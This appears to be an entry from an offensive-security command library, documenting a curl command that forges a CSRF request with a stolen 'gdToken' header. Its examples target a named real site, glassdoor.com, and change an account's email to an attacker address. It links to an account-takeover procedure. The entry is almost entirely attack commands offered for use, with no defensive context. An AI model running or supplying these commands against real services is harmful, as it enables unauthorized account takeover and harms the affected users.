---
data: 'curl "https://target.com/action" -H "gdToken: token" -d "payload"'
tags:
  - web
  - exploit
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: d2442d05-55a0-49b9-9651-903dc29d29f8
created_at: '2025-12-13T09:00:34.578Z'
updated_at: '2025-12-13T09:00:34.578Z'
verified: false
validated: true
submitted: true
---
# curl-forge-csrf-request

## Command

```bash
curl "https://target.com/action" -H "gdToken: token" -d "payload"
```

## Description

Forges a CSRF request using a stolen token to perform unauthorized actions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -H "gdToken: token" | Header with stolen token | Yes |
| -d "payload" | Data for the request | Yes |

## Examples

### Basic Usage

```bash
curl "https://www.glassdoor.com/account-action" -H "gdToken: stolen-token" -d "change-email=new@attacker.com"
```

### Advanced Usage

```bash
curl "https://www.glassdoor.com/account-action" -H "gdToken: stolen-token" -H "Cookie: session" -d "payload"
```

## Expected Output

Successful response indicating action execution.

## Related

- [[procedures/Exploit-Stolen-gdToken-for-CSRF-Account-Takeover]]
